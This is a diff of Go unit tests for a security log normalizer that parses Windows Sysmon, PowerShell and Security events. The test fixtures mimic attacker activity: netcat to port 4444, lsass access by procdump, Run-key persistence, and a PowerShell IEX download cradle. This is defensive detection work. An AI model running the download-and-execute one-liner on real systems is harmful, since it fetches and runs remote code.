+func TestSysmonFileBlocks(t *testing.T) {
+	msg := "File Block Executable:\r\nImage: C:\\Windows\\System32\\curl.exe\r\nTargetFilename: C:\\Users\\bob\\x.exe\r\nUser: CORP\\bob"
+	b, _ := json.Marshal(map[string]any{"Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "WS1", "EventID": 27, "Message": msg})
+	expect(t, Normalize("win.sysmon", decode(t, string(b)), now).Document(), map[string]any{
+		"datamodel": "Filesystem", "action": "blocked", "signature": "Executable file creation blocked",
+		"file_path": `C:\Users\bob\x.exe`, "file_name": "x.exe", "process_path": `C:\Windows\System32\curl.exe`,
+	})
+	b, _ = json.Marshal(map[string]any{"Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "WS1", "EventID": 16, "Message": "Sysmon config state changed:"})
+	expect(t, Normalize("win.sysmon", decode(t, string(b)), now).Document(), map[string]any{
+		"datamodel": "Other", "signature": "Sysmon configuration changed",
 	})
 }
 
@@ -90,13 +521,18 @@ func TestSysmonMultiLineCommandLine(t *testing.T) {
 }
 
 func TestSysmonNetwork(t *testing.T) {
-	msg := "Network connection detected:\r\nRuleName: -\r\nImage: C:\\Tools\\nc.exe\r\nUser: CORP\\bob\r\nProtocol: tcp\r\nSourceIp: 10.0.0.5\r\nSourcePort: 50000\r\nDestinationIp: 198.51.100.7\r\nDestinationHostname: -\r\nDestinationPort: 4444"
-	b, _ := json.Marshal(map[string]any{"Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "WS1", "EventID": 3, "Message": msg})
+	msg := "Network connection detected:\r\nRuleName: -\r\nImage: C:\\Tools\\nc.exe\r\nUser: CORP\\bob\r\nProtocol: tcp\r\nSourceIsIpv6: False\r\nSourceIp: 10.0.0.5\r\nSourcePort: 50000\r\nDestinationIp: 198.51.100.7\r\nDestinationHostname: -\r\nDestinationPort: 4444\r\nDestinationPortName: -"
+	b, _ := json.Marshal(map[string]any{"Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "WS1", "EventID": 3,
+		"ProviderName": "Microsoft-Windows-Sysmon", "Message": msg})
 	ev := Normalize("win.sysmon", decode(t, string(b)), now)
 	doc := ev.Document()
 	expect(t, doc, map[string]any{
 		"datamodel": "Network_Traffic", "dest": "198.51.100.7", "dest_port": int64(4444), "process_name": "nc.exe", "transport": "tcp",
+		"src_is_ipv6": "false", "provider": "Microsoft-Windows-Sysmon",
 	})
+	if _, ok := doc["dest_port_name"]; ok {
+		t.Errorf("dest_port_name '-' should be dropped")
+	}
 	if _, ok := doc["dest_host"]; ok {
 		t.Errorf("dest_host '-' should be dropped")
 	}
@@ -214,5 +650,144 @@ func TestGuessYear(t *testing.T) {
 		if got := GuessYear(st, n).Format(time.RFC3339); got != c.want {
 			t.Errorf("%s at %s = %s, want %s", c.stamp, c.now, got, c.want)
 		}
+	}
+}
+
+func TestSysmonEventTypes(t *testing.T) {
+	sysmon := func(id int, lines ...string) map[string]any {
+		b, _ := json.Marshal(map[string]any{"Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "WS1", "EventID": id,
+			"Message": strings.Join(lines, "\r\n")})
+		return Normalize("win.sysmon", decode(t, string(b)), now).Document()
+	}
+	expect(t, sysmon(7, "Image loaded:", `Image: C:\Users\bob\app.exe`, "ProcessId: 4242", `ImageLoaded: C:\Users\bob\evil.dll`,
+		"Description: Evil", "OriginalFileName: evil.dll", "Hashes: SHA256=ABCD,IMPHASH=EF01", "Signed: false", "Signature: -",
+		"SignatureStatus: Unavailable", `User: CORP\bob`), map[string]any{
+		"datamodel": "Image_Load", "process_name": "app.exe", "loaded_file_path": `C:\Users\bob\evil.dll`, "loaded_file_name": "evil.dll",
+		"signed": "false", "signature_status": "Unavailable", "process_id": int64(4242), "user": `CORP\bob`,
+		"loaded_file_description": "Evil", "loaded_original_file_name": "evil.dll", "loaded_file_hash": "SHA256=ABCD,IMPHASH=EF01",
+	})
+	expect(t, sysmon(10, "Process accessed:", `SourceImage: C:\Tools\procdump.exe`, "SourceProcessId: 77", `TargetImage: C:\Windows\system32\lsass.exe`,
+		"TargetProcessId: 640", "GrantedAccess: 0x1410", `CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9d4c4|UNKNOWN(00007FFB)`, `SourceUser: CORP\bob`), map[string]any{
+		"datamodel": "Endpoint", "signature": "Process accessed", "process_name": "procdump.exe", "target_process_name": "lsass.exe",
+		"target_process_id": int64(640), "granted_access": "0x1410", "call_trace": `C:\Windows\SYSTEM32\ntdll.dll+9d4c4|UNKNOWN(00007FFB)`,
+	})
+	expect(t, sysmon(8, "CreateRemoteThread detected:", `SourceImage: C:\Tools\inject.exe`, `TargetImage: C:\Windows\explorer.exe`,
+		"StartAddress: 0x00000000025D0000", "StartModule: -", "StartFunction: -"), map[string]any{
+		"datamodel": "Endpoint", "signature": "Remote thread created", "target_process_path": `C:\Windows\explorer.exe`, "start_address": "0x00000000025D0000",
+	})
+	expect(t, sysmon(11, "File created:", `Image: C:\Windows\System32\cmd.exe`, `TargetFilename: C:\Users\bob\AppData\Roaming\run.vbs`), map[string]any{
+		"datamodel": "Filesystem", "action": "created", "file_name": "run.vbs", "process_name": "cmd.exe",
+	})
+	expect(t, sysmon(23, "File Delete archived:", `Image: C:\x.exe`, `TargetFilename: C:\logs\a.log`, "Hashes: SHA256=ABCD"), map[string]any{
+		"datamodel": "Filesystem", "action": "deleted", "file_path": `C:\logs\a.log`, "file_hash": "abcd",
+	})
+	expect(t, sysmon(13, "Registry value set:", "EventType: SetValue", `Image: C:\x.exe`,
+		`TargetObject: HKU\S-1-5-21\Software\Microsoft\Windows\CurrentVersion\Run\Updater`, `Details: C:\Users\bob\u.exe`), map[string]any{
+		"datamodel": "Registry", "action": "modified", "registry_value_name": "Updater", "registry_key_name": "Run",
+		"registry_value_data": `C:\Users\bob\u.exe`, "registry_event_type": "SetValue",
+	})
+	expect(t, sysmon(12, "Registry object added or deleted:", "EventType: CreateKey", `TargetObject: HKLM\System\CurrentControlSet\Services\Evil`), map[string]any{
+		"datamodel": "Registry", "action": "created", "registry_key_name": "Evil",
+	})
+	expect(t, sysmon(5, "Process terminated:", `Image: C:\Windows\System32\vssadmin.exe`, "ProcessId: 4242", `User: CORP\bob`), map[string]any{
+		"datamodel": "Endpoint", "action": "stopped", "signature_id": "5", "process_name": "vssadmin.exe", "process_id": int64(4242),
+	})
+	expect(t, sysmon(9, "RawAccessRead detected:", `Image: C:\Tools\dd.exe`, `Device: \Device\Harddisk0\DR0`), map[string]any{
+		"datamodel": "Endpoint", "signature": "RawAccessRead detected", "device": `\Device\Harddisk0\DR0`, "process_name": "dd.exe",
+	})
+	expect(t, sysmon(15, "File stream created:", `Image: C:\Program Files\Mozilla Firefox\firefox.exe`,
+		`TargetFilename: C:\Users\bob\Downloads\setup.exe:Zone.Identifier`, "Hash: SHA256=ABCD,IMPHASH=00",
+		`Contents: [ZoneTransfer]  ZoneId=3`), map[string]any{
+		"datamodel": "Filesystem", "action": "created", "signature": "File stream created", "file_name": "setup.exe:Zone.Identifier",
+		"file_hash": "abcd", "file_hashes": "SHA256=ABCD,IMPHASH=00", "file_contents": "[ZoneTransfer]  ZoneId=3", "process_name": "firefox.exe",
+	})
+	expect(t, sysmon(17, "Pipe Created:", "EventType: CreatePipe", `PipeName: \MSSE-1234-server`, `Image: C:\Users\bob\beacon.exe`), map[string]any{
+		"datamodel": "Endpoint", "signature": "Pipe Created", "pipe_name": `\MSSE-1234-server`, "pipe_event_type": "CreatePipe", "process_name": "beacon.exe",
+	})
+	expect(t, sysmon(18, "Pipe Connected:", "EventType: ConnectPipe", `PipeName: \lsarpc`, `Image: C:\x.exe`), map[string]any{
+		"datamodel": "Endpoint", "signature": "Pipe Connected", "pipe_name": `\lsarpc`, "pipe_event_type": "ConnectPipe",
+	})
+	expect(t, sysmon(22, "Dns query:", `Image: C:\x.exe`, "QueryName: bad.example", "QueryStatus: 9003", "QueryResults: -"), map[string]any{
+		"datamodel": "Network_Resolution", "query": "bad.example", "reply_code": "NXDomain", "process_name": "x.exe",
+	})
+
+	b, _ := json.Marshal(map[string]any{"Channel": "Microsoft-Windows-PowerShell/Operational", "Computer": "WS1", "EventID": "4104",
+		"StringInserts": []string{"2", "3", "IEX (New-Object Net.WebClient).DownloadString('http://x')", "{5d1b4c2e-0d3a-4b8e-9c71-2a5d8e4f9b10}", ""}})
+	expect(t, Normalize("win.powershell", decode(t, string(b)), now).Document(), map[string]any{
+		"datamodel": "Script", "script_block_text": "IEX (New-Object Net.WebClient).DownloadString('http://x')",
+		"script_block_id": "5d1b4c2e-0d3a-4b8e-9c71-2a5d8e4f9b10", "script_part": int64(2), "script_parts": int64(3),
+	})
+}
+
+func TestWindowsSecurityNamedEvents(t *testing.T) {
+	security := func(id string, data map[string]string) map[string]any {
+		return Normalize("win.events", WinEventRecord("Security", id, "DC1", now, data), now).Document()
+	}
+	subject := func(m map[string]string) map[string]string {
+		m["SubjectUserSid"], m["SubjectUserName"], m["SubjectDomainName"], m["SubjectLogonId"] = "S-1-5-21-1-1104", "eve", "CORP", "0x1a2b"
+		return m
+	}
+	expect(t, security("4776", map[string]string{"PackageName": "MICROSOFT_AUTHENTICATION_PACKAGE_V1_0", "TargetUserName": "bob",
+		"Workstation": "RULER", "Status": "0xc0000064"}), map[string]any{
+		"datamodel": "Authentication", "action": "failure", "user": "bob", "src_host": "RULER", "ntlm_status": "0xc0000064",
+		"authentication_method": "MICROSOFT_AUTHENTICATION_PACKAGE_V1_0",
+	})
+	expect(t, security("4771", map[string]string{"TargetUserName": "bob", "TargetSid": "S-1-5-21-1-1105", "ServiceName": "krbtgt/CORP",
+		"TicketOptions": "0x40810010", "Status": "0x18", "PreAuthType": "2", "IpAddress": "::ffff:192.0.2.10", "IpPort": "50123"}), map[string]any{
+		"datamodel": "Authentication", "action": "failure", "user": "bob", "kerberos_status": "0x18", "src": "192.0.2.10", "src_port": int64(50123),
+	})
+	expect(t, security("4741", subject(map[string]string{"TargetUserName": "EVIL$", "TargetDomainName": "CORP", "TargetSid": "S-1-5-21-1-3001",
+		"SamAccountName": "EVIL$", "NewUacValue": "0x80", "UserAccountControl": "\r\n\t\t%%2087", "DnsHostName": "evil.corp.example.com",
+		"ServicePrincipalNames": "HOST/evil.corp.example.com\r\n\t\tRestrictedKrbHost/EVIL"})), map[string]any{
+		"datamodel": "Change", "action": "created", "object_category": "computer", "object": "EVIL$", "user": "eve", "user_sid": "S-1-5-21-1-1104",
+		"new_uac_value": "0x80", "user_account_control": "%%2087", "dns_host_name": "evil.corp.example.com",
+		"service_principal_names": "HOST/evil.corp.example.com RestrictedKrbHost/EVIL",
+	})
+	expect(t, security("4742", subject(map[string]string{"ComputerAccountChange": "-", "TargetUserName": "WS2$",
+		"ServicePrincipalNames": "GC/dc2.corp.example.com/corp.example.com"})), map[string]any{
+		"action": "modified", "object": "WS2$", "service_principal_names": "GC/dc2.corp.example.com/corp.example.com",
+	})
+	expect(t, security("4781", subject(map[string]string{"OldTargetUserName": "Administrator", "NewTargetUserName": "admin2",
+		"TargetDomainName": "CORP", "TargetSid": "S-1-5-21-1-500"})), map[string]any{
+		"datamodel": "Change", "object": "admin2", "old_object": "Administrator", "object_sid": "S-1-5-21-1-500", "user": "eve",
+	})
+	expect(t, security("4727", subject(map[string]string{"TargetUserName": "ESX Admins", "TargetDomainName": "CORP", "SamAccountName": "ESX Admins"})),
+		map[string]any{"action": "created", "object_category": "group", "object": "ESX Admins", "sam_account_name": "ESX Admins"})
+	expect(t, security("4730", subject(map[string]string{"TargetUserName": "Old Group"})), map[string]any{"action": "deleted", "object": "Old Group"})
+	expect(t, security("4729", subject(map[string]string{"MemberSid": "S-1-5-21-1-1105", "TargetUserName": "Domain Admins"})),
+		map[string]any{"action": "modified", "member_sid": "S-1-5-21-1-1105", "object": "Domain Admins"})
+	expect(t, security("4798", subject(map[string]string{"TargetUserName": "bob", "CallerProcessId": "0x1a4",
+		"CallerProcessName": `C:\Users\eve\AppData\Roaming\Telegram Desktop\Telegram.exe`})), map[string]any{
+		"action": "read", "object": "bob", "process_name": "Telegram.exe", "process_id": int64(420),
+	})
+	expect(t, security("4887", map[string]string{"RequestId": "57", "Requester": `CORP\eve`,
+		"Attributes": "CertificateTemplate:ESC1\nSAN:upn=administrator@corp.example.com", "Disposition": "3", "Subject": "CN=eve"}), map[string]any{
+		"action": "created", "object_category": "certificate", "cert_request_id": "57", "cert_requester": `CORP\eve`,
+		"cert_attributes": "CertificateTemplate:ESC1\nSAN:upn=administrator@corp.example.com", "cert_subject": "CN=eve",
+	})
+	expect(t, security("1102", subject(map[string]string{})), map[string]any{"action": "deleted", "object_category": "audit_log", "user": "eve"})
+	expect(t, security("4702", subject(map[string]string{"TaskName": `\Updater`,
+		"TaskContentNew": `<Task><Actions><Exec><Command>cmd.exe</Command><Arguments>/c whoami</Arguments></Exec></Actions></Task>`})), map[string]any{
+		"action": "modified", "task_name": `\Updater`, "task_command": "cmd.exe", "task_arguments": "/c whoami",
+	})
+	expect(t, security("5140", subject(map[string]string{"ObjectType": "File", "IpAddress": "192.0.2.10", "IpPort": "50123",
+		"ShareName": `\\*\ADMIN$`, "ShareLocalPath": `\??\C:\Windows`, "AccessMask": "0x1", "AccessList": "%%4416"})), map[string]any{
+		"datamodel": "Filesystem", "share_name": `\\*\ADMIN$`, "share_path": `\??\C:\Windows`, "src": "192.0.2.10", "user": "eve",
+	})
+}
+
+// TestSysmonLongMultiLineValueIsLinear: a command line continued over
+// many lines used to be added to line by line, copying it each time, so a
+// 1 MB record took minutes.
+func TestSysmonLongMultiLineValueIsLinear(t *testing.T) {
+	lines := strings.Repeat("x\r\n", 1<<18)
+	msg := "Process Create:\r\nImage: C:\\a.exe\r\nCommandLine: a.exe\r\n" + lines + "User: CORP\\bob"
+	start := time.Now()
+	kv := keyValues(msg)
+	if took := time.Since(start); took > 3*time.Second {
+		t.Fatalf("took %v", took)
+	}
+	if want := "a.exe" + strings.Repeat("\nx", 1<<18); kv["CommandLine"] != want || kv["User"] != `CORP\bob` {
+		t.Fatalf("CommandLine is %d bytes, User %q", len(kv["CommandLine"]), kv["User"])
 	}
 }
